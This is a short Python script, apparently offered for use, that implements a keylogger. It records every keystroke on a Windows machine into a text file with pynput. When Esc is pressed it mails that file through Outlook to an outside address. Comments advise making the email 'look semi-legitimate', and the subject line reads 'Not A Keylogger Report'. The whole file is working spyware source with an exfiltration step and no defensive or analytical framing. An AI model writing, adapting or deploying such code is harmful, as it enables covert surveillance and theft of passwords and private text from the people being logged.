import win32com.client as win32
from pynput import keyboard
import os

# This function is used to write to the log file when a key is pressed
def on_press(key):
    try:
        # Write normal keys directly
        log_file.write(str(key.char))
    except AttributeError:
        # Write special keys like space, enter, shift, etc.
        log_file.write(f"[{key}] ")

# This function is used to check if the ESC key is pressed (released) to stop writing to the log file
def on_release(key):
    if key == keyboard.Key.esc:
        log_file.close()  # Close the log file before stopping the listener
        return False  # Stops the listener after the Esc key is pressed

# Function to send email with log file
def send_email_with_attachment(file_path):
    # Start outlook
    outlook = win32.Dispatch('outlook.application')
    mail = outlook.CreateItem(0)
    
    # Configure email properties, use this to choose where to send the email and make it look semi-legitimate
    mail.To = 'google@google.com'
    mail.Subject = 'Not A Keylogger Report'
    mail.Body = 'This is not a keylogger report.'
    
    # Attach the keylog file
    mail.Attachments.Add(file_path)
    
    # Send the email
    mail.Send()

# makes c:\temp if it doesnt exist to store log file

# Open the log file and overwrite any log file named keylog.txt. I you want to append change 'w' to 'a'
log_file = open('C:\\temp\\keylog.txt', 'w')

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Wait for the listener to stop (Esc is pressed)

# After the listener stops, send the email
send_email_with_attachment('C:\\temp\\keylog.txt')
